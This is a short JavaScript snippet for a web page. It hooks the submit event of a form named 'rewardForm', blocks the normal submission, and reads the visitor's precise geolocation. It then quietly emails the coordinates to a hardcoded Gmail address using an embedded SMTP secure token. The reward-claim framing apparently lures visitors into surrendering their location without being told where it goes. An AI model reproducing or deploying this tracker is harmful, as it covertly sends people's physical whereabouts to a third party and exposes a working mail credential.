<script>
    function sendEmail(subject, message, recipientEmail) {
        try {
            Email.send({
                SecureToken: "C973D7AD-F097-4B95-91F4-40ABC5567812", // Replace with your secure token
                To: recipientEmail,
                From: "khalilrodeni@gmail.com", // Replace with your email
                Subject: subject,
                Body: message,
            })
            .then(response => {
                if (response === "OK") {
                    alert("Email sent successfully!");
                } else {
                    alert("Error sending email: " + response);
                }
            })
            .catch(error => {
                alert("Error sending email: " + error.message);
            });
        } catch (error) {
            alert("Unexpected error: " + error.message);
        }
    }

    function sendLocationEmail(latitude, longitude) {
        const message = `Geolocation Data:\nLatitude: ${latitude},\nLongitude: ${longitude}`;
        sendEmail("Geolocation Data", message, "khalilrodeni@gmail.com");
    }

    function trackMovement() {
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    sendLocationEmail(latitude, longitude);
                },
                (error) => {
                    let errorMessage;
                    switch (error.code) {
                        case error.PERMISSION_DENIED:
                            errorMessage = "Location access denied by user.";
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMessage = "Location information is unavailable.";
                            break;
                        case error.TIMEOUT:
                            errorMessage = "Location request timed out.";
                            break;
                        default:
                            errorMessage = "An unknown error occurred.";
                    }
                    alert(errorMessage);
                },
                { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
            );
        } else {
            alert("Geolocation is not supported by this browser.");
        }
    }

    // When the form is submitted, track location and send email
    document.getElementById("rewardForm").addEventListener("submit", function(event) {
        event.preventDefault(); // Prevent form submission
        trackMovement();
    });
</script>
